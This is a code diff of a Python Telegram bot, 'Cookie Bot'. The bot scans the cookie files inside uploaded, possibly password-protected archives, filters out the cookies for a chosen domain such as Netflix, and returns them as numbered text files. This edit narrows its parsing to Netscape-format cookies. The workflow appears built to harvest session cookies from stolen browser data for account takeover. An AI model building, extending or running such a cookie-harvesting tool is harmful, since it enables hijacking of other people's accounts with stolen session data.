@@ -178,37 +178,6 @@ def domain_matches(cookie_domain: str, search_domain: str) -> bool:
     
     return False
 
-# ── Content validation ────────────────────────────────────────────────────────
-def is_valid_cookie_content(content: bytes) -> bool:
-    """
-    Check if content has any readable cookie-like data
-    """
-    try:
-        # Try to decode as text
-        text = content.decode('utf-8', errors='ignore')
-        
-        # Check for domain patterns
-        if re.search(r'[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text):
-            # Check for tab-separated format
-            lines = text.splitlines()
-            for line in lines[:20]:  # Check first 20 lines
-                line = line.strip()
-                if not line or line.startswith('#'):
-                    continue
-                if '\t' in line and len(line.split('\t')) >= 3:
-                    return True
-                # Check for JSON structure
-                if line.startswith(('{', '[')) and any(kw in line.lower() for kw in ['domain', 'name', 'value']):
-                    return True
-        
-        # Check for SQLite header
-        if content.startswith(b'SQLite format'):
-            return True
-            
-        return False
-    except:
-        return False
-
 # ── Netscape cookie parser ────────────────────────────────────────────────────
 def parse_netscape_cookies(text: str, domain_filter: str):
     """
@@ -244,7 +213,7 @@ def parse_netscape_cookies(text: str, domain_filter: str):
     
     return results
 
-# ── SQLite cookie parser ──────────────────────────────────────────────────────
+# ── SQLite cookie parser (kept for future use) ───────────────────────────────
 def parse_sqlite_cookies(content: bytes, domain_filter: str) -> list:
     """
     Parse cookies from SQLite database files (Chrome, Firefox, Edge)
@@ -271,8 +240,6 @@ def parse_sqlite_cookies(content: bytes, domain_filter: str) -> list:
             # Generic
             "SELECT host, path, secure, expires, name, value FROM cookies",
             "SELECT domain, path, secure, expiry, name, value FROM cookie",
-            # Edge/Others
-            "SELECT domain, path, secure, expiration, name, value FROM cookies",
         ]
         
         for query in queries:
@@ -304,7 +271,7 @@ def parse_sqlite_cookies(content: bytes, domain_filter: str) -> list:
     
     return results
 
-# ── JSON cookie parser ────────────────────────────────────────────────────────
+# ── JSON cookie parser (kept for future use) ─────────────────────────────────
 def parse_json_cookies(content: bytes, domain_filter: str) -> list:
     """
     Parse cookies from JSON format
@@ -315,7 +282,7 @@ def parse_json_cookies(content: bytes, domain_filter: str) -> list:
         # Try to clean the text (remove BOM, etc.)
         text = text.lstrip('\ufeff').strip()
         
-        # Try to find JSON object in text (in case there's surrounding text)
+        # Try to find JSON object in text
         json_match = re.search(r'(\{.*\}|\[.*\])', text, re.DOTALL)
         if json_match:
             text = json_match.group(1)
@@ -328,7 +295,7 @@ def parse_json_cookies(content: bytes, domain_filter: str) -> list:
             cookies_list = data
         elif isinstance(data, dict):
             # Try common keys
-            for key in ['cookies', 'cookie', 'data', 'items', 'rows', 'entries']:
+            for key in ['cookies', 'cookie', 'data', 'items']:
                 if key in data and isinstance(data[key], list):
                     cookies_list = data[key]
                     break
@@ -336,12 +303,6 @@ def parse_json_cookies(content: bytes, domain_filter: str) -> list:
                 # Maybe it's a single cookie object
                 if 'name' in data and 'value' in data:
                     cookies_list = [data]
-                else:
-                    # Try to find any array in the dict
-                    for value in data.values():
-                        if isinstance(value, list):
-                            cookies_list = value
-                            break
         
         for cookie in cookies_list:
             if isinstance(cookie, dict):
@@ -361,152 +322,6 @@ def parse_json_cookies(content: bytes, domain_filter: str) -> list:
         print(f"JSON parse error: {e}")
     
     return results
-
-# ── URL-encoded cookie parser ─────────────────────────────────────────────────
-def parse_urlencoded_cookies(content: bytes, domain_filter: str) -> list:
-    """
-    Parse URL-encoded cookie data
-    """
-    results = []
-    try:
-        text = content.decode('utf-8', errors='ignore')
-        
-        # URL decode the text
-        decoded = urllib.parse.unquote(text)
-        
-        # Try to parse as Netscape format first
-        netscape_results = parse_netscape_cookies(decoded, domain_filter)
-        if netscape_results:
-            return netscape_results
-        
-        # Look for cookie patterns in the decoded text
-        # Pattern: domain.com|domain|path|secure|expiry|name|value
-        patterns = [
-            r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})[|\t]+\"?([A-Z]+)\"?[|\t]+([^|\t]+)[|\t]+\"?([A-Z]+)\"?[|\t]+(\d+)[|\t]+([^|\t]+)[|\t]+(.+?)(?=[|\n]|$)',
-            r'domain[=:]\s*[\'"]([^\'"]+)[\'"][,\s]+name[=:]\s*[\'"]([^\'"]+)[\'"][,\s]+value[=:]\s*[\'"]([^\'"]+)[\'"]',
-        ]
-        
-        for pattern in patterns:
-            matches = re.findall(pattern, decoded, re.IGNORECASE)
-            for match in matches:
-                if len(match) >= 3:
-                    # Try to construct Netscape format
-                    domain = match[0] if '.' in match[0] else domain_filter
-                    if domain_matches(domain, domain_filter):
-                        name = match[-2] if len(match) > 2 else 'unknown'
-                        value = match[-1]
-                        results.append(f"{domain}\tFALSE\t/\tFALSE\t0\t{name}\t{value}")
-    except Exception as e:
-        print(f"URL decode error: {e}")
-    
-    return results
-
-# ── Binary cookie extractor ───────────────────────────────────────────────────
-def extract_cookies_from_binary(content: bytes, domain_filter: str) -> list:
-    """
-    Extract cookie-like patterns from binary/encoded data
-    """
-    results = []
-    try:
-        # Try to decode as text, ignoring errors
-        text = content.decode('utf-8', errors='ignore')
-        
-        # Look for patterns that might be cookies
-        patterns = [
-            # Netscape-like pattern with various separators
-            r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?:[|\s\t]+)(TRUE|FALSE)(?:[|\s\t]+)([^|\s\t]+)(?:[|\s\t]+)(TRUE|FALSE)(?:[|\s\t]+)(\d+)(?:[|\s\t]+)([^|\s\t]+)(?:[|\s\t]+)([^\n\r|]+)',
-            
-            # Domain with name=value pairs
-            r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})[^a-zA-Z0-9]+([a-zA-Z0-9_]+)=([^;&\s\n\r]+)',
-            
-            # JSON-like structures
-            r'["\']domain["\']\s*:\s*["\']([^"\']+)["\'][,\s]+["\']name["\']\s*:\s*["\']([^"\']+)["\'][,\s]+["\']value["\']\s*:\s*["\']([^"\']+)["\']',
-            
-            # Cookie string format
-            r'([a-zA-Z0-9_]+)=([^;\s]+);\s*(?:domain=([^;\s]+))?',
-        ]
-        
-        for pattern in patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            for match in matches:
-                if len(match) >= 2:
-                    # Determine which part is domain
-                    domain = None
-                    name = None
-                    value = None
-                    
-                    # Try to identify fields
-                    for part in match:
-                        if '.' in part and any(tld in part for tld in ['.com', '.org', '.net', '.io', '.co', '.uk', '.de', '.fr', '.ru', '.jp', '.br']):
-                            domain = part
-                        elif part and part not in ('TRUE', 'FALSE') and len(part) < 50:
-                            if not name:
-                                name = part
-                            elif not value and name and part != name:
-                                value = part
-                    
-                    if domain and name and value and domain_matches(domain, domain_filter):
-                        results.append(f"{domain}\tFALSE\t/\tFALSE\t0\t{name}\t{value}")
-    except Exception as e:
-        print(f"Binary extraction error: {e}")
-    
-    return results
-
-# ── Main cookie parser (chooses appropriate method) ───────────────────────────
-def parse_cookies(content: bytes, filename: str, domain_filter: str) -> list:
-    """
-    Parse cookies from various formats based on file type and content
-    """
-    domain_filter = domain_filter.strip().lower().lstrip(".")
-    filename_lower = filename.lower()
-    
-    # Quick validation - skip obviously invalid content
-    if not is_valid_cookie_content(content):
-        return []
-    
-    # Check file extension to determine parsing method
-    if filename_lower.endswith(('.sqlite', '.db')):
-        results = parse_sqlite_cookies(content, domain_filter)
-        if results:
-            print(f"✅ Parsed SQLite cookie file: {filename} ({len(results)} cookies)")
-            return results
-    
-    elif filename_lower.endswith('.json'):
-        results = parse_json_cookies(content, domain_filter)
-        if results:
-            print(f"✅ Parsed JSON cookie file: {filename} ({len(results)} cookies)")
-            return results
-    
-    # Try Netscape format first (most common)
-    try:
-        text = content.decode('utf-8', errors='ignore')
-        results = parse_netscape_cookies(text, domain_filter)
-        if results:
-            print(f"✅ Parsed Netscape cookie file: {filename} ({len(results)} cookies)")
-            return results
-    except:
-        pass
-    
-    # Try URL-decoded format
-    results = parse_urlencoded_cookies(content, domain_filter)
-    if results:
-        print(f"✅ Parsed URL-encoded cookie file: {filename} ({len(results)} cookies)")
-        return results
-    
-    # Try JSON again (might be in binary)
-    results = parse_json_cookies(content, domain_filter)
-    if results:
-        print(f"✅ Parsed JSON (binary) cookie file: {filename} ({len(results)} cookies)")
-        return results
-    
-    # Try binary extraction as last resort
-    results = extract_cookies_from_binary(content, domain_filter)
-    if results:
-        print(f"✅ Extracted cookies from binary file: {filename} ({len(results)} cookies)")
-        return results
-    
-    print(f"⏭️ No cookies found in: {filename}")
-    return []
 
 # ── PHASE 1: Count all files inside archive ───────────────────────────────────
 def count_archive_contents(path: str, password: bytes = None) -> dict:
@@ -687,7 +502,7 @@ async def start_handler(client: Client, message: Message):
         "🔹 Get `NETFLIX_1.txt`, `NETFLIX_2.txt` ...\n\n"
         f"🔐 Password protected supported\n"
         f"{'✅ RAR supported' if RAR_SUPPORTED else '⚠️ RAR unavailable'}\n"
-        f"📊 Multi-format parsing: Netscape, SQLite, JSON, URL-encoded",
+        f"📊 Only valid Netscape format cookies are saved",
         parse_mode=enums.ParseMode.MARKDOWN
     )
 
@@ -889,18 +704,18 @@ async def process_archive(client: Client, message: Message):
     total_cookie_files = len(cookie_files)
 
     # ════════════════════════════════════════════════════════════════════════
-    # PHASE 3 — SCAN COOKIES (MULTI-FORMAT) - FIXED: Only create files with cookies
+    # PHASE 3 — SCAN COOKIES - FIXED: Only create files with valid Netscape cookies
     # ════════════════════════════════════════════════════════════════════════
     output_zip_path = f"/tmp/{uid}_{domain}_results.zip"
     total_matches = 0
-    output_file_counter = 1  # Renamed from 'counter' to avoid confusion
+    output_file_counter = 1
     scan_start = time.time()
     last_scan_update = [0]
-    parsed_formats = {"netscape": 0, "sqlite": 0, "json": 0, "urlencoded": 0, "binary": 0}
-    files_with_cookies = 0  # Track how many files actually contained cookies
-    skipped_files = 0  # Track skipped files
+    files_with_cookies = 0
+    skipped_binary = 0
+    skipped_no_matches = 0
 
-    # Show initial scan bar immediately
+    # Show initial scan bar
     await status.edit_text(
         f"🔍 **Phase 3/3 — Scanning** `{domain}`\n"
         f"`[░░░░░░░░░░░░░░░░░░░░]` **0.0%**\n"
@@ -915,14 +730,52 @@ async def process_archive(client: Client, message: Message):
         with zipfile.ZipFile(output_zip_path, 'w', zipfile.ZIP_DEFLATED) as zf_out:
             for i, (orig_path, content_bytes) in enumerate(cookie_files):
                 try:
-                    # Quick validation - skip obviously invalid content
-                    if not is_valid_cookie_content(content_bytes):
-                        skipped_files += 1
-                        print(f"⏭️ Skipping invalid/binary file: {orig_path}")
+                    # Try to decode as text
+                    text = content_bytes.decode('utf-8', errors='ignore')
+                    
+                    # Check if this is valid Netscape format (tab-separated with domain)
+                    is_valid_netscape = False
+                    lines = text.splitlines()
+                    for line in lines[:10]:  # Check first 10 lines
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            parts = line.split('\t')
+                            if len(parts) >= 7 and '.' in parts[0]:
+                                is_valid_netscape = True
+                                break
+                    
+                    if not is_valid_netscape:
+                        # This is likely binary/encoded data - skip it
+                        skipped_binary += 1
+                        print(f"⏭️ Skipping binary/unreadable file: {orig_path}")
+                        
+                        # Update progress for skipped files
+                        now = time.time()
+                        if now - last_scan_update[0] >= 2.0:
+                            last_scan_update[0] = now
+                            elapsed = now - scan_start
+                            speed = (i + 1) / elapsed if elapsed > 0 else 0
+                            remaining = total_cookie_files - (i + 1)
+                            eta = int(remaining / speed) if speed > 0 else 0
+                            pct = (i + 1) / total_cookie_files * 100 if total_cookie_files > 0 else 0
+                            bar = "█" * int(pct/5) + "░" * (20 - int(pct/5))
+                            eta_s = f"{eta//60}m {eta%60}s" if eta >= 60 else f"{eta}s"
+                            try:
+                                await status.edit_text(
+                                    f"🔍 **Phase 3/3 — Scanning** `{domain}`\n"
+                                    f"`[{bar}]` **{pct:.1f}%**\n"
+                                    f"📂 Files: **{i+1:,}** / **{total_cookie_files:,}**\n"
+                                    f"🚀 Speed: **{speed:.0f} files/s**\n"
+                                    f"⏳ ETA: **{eta_s}**\n"
+                                    f"🍪 Cookies found: **{total_matches:,}** in **{files_with_cookies}** files\n"
+                                    f"📊 Skipped: binary={skipped_binary} no-match={skipped_no_matches}",
+                                    parse_mode=enums.ParseMode.MARKDOWN
+                                )
+                            except: pass
                         continue
                     
-                    # Use multi-format parser
-                    matches = parse_cookies(content_bytes, orig_path, domain)
+                    # Parse Netscape cookies
+                    matches = parse_netscape_cookies(text, domain)
                     
                     # ONLY create output file if matches were found
                     if matches and len(matches) > 0:
@@ -932,23 +785,16 @@ async def process_archive(client: Client, message: Message):
                         files_with_cookies += 1
                         output_file_counter += 1
                         
-                        # Track format type
-                        if orig_path.endswith(('.sqlite', '.db')):
-                            parsed_formats["sqlite"] += 1
-                        elif orig_path.endswith('.json'):
-                            parsed_formats["json"] += 1
-                        else:
-                            parsed_formats["netscape"] += 1
-                        
                         print(f"✅ Created {out_name} with {len(matches)} cookies from {orig_path}")
                     else:
-                        print(f"⏭️ Skipped {orig_path} - no cookies found")
-                            
+                        skipped_no_matches += 1
+                        print(f"⏭️ No cookies for domain in: {orig_path}")
+                        
                 except Exception as e:
                     print(f"⚠️ Error processing {orig_path}: {e}")
-                    skipped_files += 1
+                    skipped_binary += 1
 
-                # Update scan bar every 2s
+                # Update scan bar
                 now = time.time()
                 if now - last_scan_update[0] >= 2.0:
                     last_scan_update[0] = now
@@ -960,7 +806,6 @@ async def process_archive(client: Client, message: Message):
                     bar = "█" * int(pct/5) + "░" * (20 - int(pct/5))
                     eta_s = f"{eta//60}m {eta%60}s" if eta >= 60 else f"{eta}s"
                     try:
-                        format_info = f"📊 Formats: Netscape:{parsed_formats['netscape']} SQLite:{parsed_formats['sqlite']} JSON:{parsed_formats['json']}"
                         await status.edit_text(
                             f"🔍 **Phase 3/3 — Scanning** `{domain}`\n"
                             f"`[{bar}]` **{pct:.1f}%**\n"
@@ -968,61 +813,52 @@ async def process_archive(client: Client, message: Message):
                             f"🚀 Speed: **{speed:.0f} files/s**\n"
                             f"⏳ ETA: **{eta_s}**\n"
                             f"🍪 Cookies found: **{total_matches:,}** in **{files_with_cookies}** files\n"
-                            f"{format_info}",
+                            f"📊 Skipped: binary={skipped_binary} no-match={skipped_no_matches}",
                             parse_mode=enums.ParseMode.MARKDOWN
                         )
                     except: pass
 
-        # Final result - ONLY if we have matches
+        # Final result - ONLY files with valid cookies
         if total_matches > 0:
-            format_summary = f"\n📊 **Parsing Summary:**\n"
-            format_summary += f"• Netscape: {parsed_formats['netscape']} files\n"
-            format_summary += f"• SQLite: {parsed_formats['sqlite']} files\n"
-            format_summary += f"• JSON: {parsed_formats['json']} files"
-            if skipped_files > 0:
-                format_summary += f"\n• Skipped (invalid): {skipped_files} files"
+            summary = f"\n📊 **Summary:**\n"
+            summary += f"• Valid cookie files: {files_with_cookies}\n"
+            summary += f"• Skipped (binary data): {skipped_binary}\n"
+            summary += f"• Skipped (no domain match): {skipped_no_matches}"
             
             await status.edit_text(
                 f"✅ **Done! Scan complete**\n\n"
                 f"🍪 **{total_matches:,} cookies** for `{domain}`\n"
-                f"📄 **{files_with_cookies}** output files (from {total_cookie_files} scanned)\n"
-                f"{format_summary}\n\n"
+                f"📄 **{files_with_cookies}** output files\n"
+                f"📂 Scanned **{total_cookie_files:,}** total files{summary}\n\n"
                 f"📦 Sending ZIP...",
                 parse_mode=enums.ParseMode.MARKDOWN
             )
             
-            # Only send if we have files in the zip
-            if files_with_cookies > 0:
-                await client.send_document(
-                    message.chat.id,
-                    document=output_zip_path,
-                    caption=(
-                        f"🍪 **{total_matches:,} cookies** for `{domain}`\n"
-                        f"📄 `{domain_prefix}_1.txt` → `{domain_prefix}_{files_with_cookies}.txt`\n"
-                        f"📊 Scanned {total_cookie_files} files, found cookies in {files_with_cookies}\n"
-                        f"📋 Formats: Netscape:{parsed_formats['netscape']} SQLite:{parsed_formats['sqlite']} JSON:{parsed_formats['json']}"
-                    ),
-                    parse_mode=enums.ParseMode.MARKDOWN
-                )
-                
-                # Final update
-                await status.edit_text(
-                    f"✅ **All done!**\n\n"
+            # Send the ZIP with only valid cookie files
+            await client.send_document(
+                message.chat.id,
+                document=output_zip_path,
+                caption=(
                     f"🍪 **{total_matches:,} cookies** for `{domain}`\n"
-                    f"📄 **{files_with_cookies}** files sent above ⬆️\n"
-                    f"📂 Scanned **{total_cookie_files:,}** cookie files{format_summary}",
-                    parse_mode=enums.ParseMode.MARKDOWN
-                )
-            else:
-                await status.edit_text(
-                    f"❌ **Error**: No valid cookies found to send",
-                    parse_mode=enums.ParseMode.MARKDOWN
-                )
+                    f"📄 `{domain_prefix}_1.txt` → `{domain_prefix}_{files_with_cookies}.txt`\n"
+                    f"📊 Scanned {total_cookie_files} files\n"
+                    f"✅ Valid: {files_with_cookies} | ❌ Binary: {skipped_binary} | ⚠️ No match: {skipped_no_matches}"
+                ),
+                parse_mode=enums.ParseMode.MARKDOWN
+            )
+            
+            await status.edit_text(
+                f"✅ **All done!**\n\n"
+                f"🍪 **{total_matches:,} cookies** for `{domain}`\n"
+                f"📄 **{files_with_cookies}** files sent above ⬆️\n"
+                f"📂 Scanned **{total_cookie_files:,}** files{summary}",
+                parse_mode=enums.ParseMode.MARKDOWN
+            )
         else:
             await status.edit_text(
                 f"❌ **No cookies** found for `{domain}`\n"
-                f"📂 Scanned **{total_cookie_files:,}** cookie files\n"
-                f"⚠️ Skipped **{skipped_files}** invalid/binary files",
+                f"📂 Scanned **{total_cookie_files:,}** files\n"
+                f"📊 Binary files skipped: {skipped_binary}",
                 parse_mode=enums.ParseMode.MARKDOWN
             )
 
@@ -1050,7 +886,7 @@ def run_server():
 
 if __name__ == "__main__":
     print("🚀 Cookie Bot Starting...")
-    print(f"📊 Multi-format cookie parser enabled")
-    print(f"🔍 Supported formats: Netscape, SQLite, JSON, URL-encoded, Binary")
+    print(f"📊 Only valid Netscape format cookies will be saved")
+    print(f"🔍 Binary/encoded files will be skipped")
     threading.Thread(target=run_server, daemon=True).start()
     app.run()
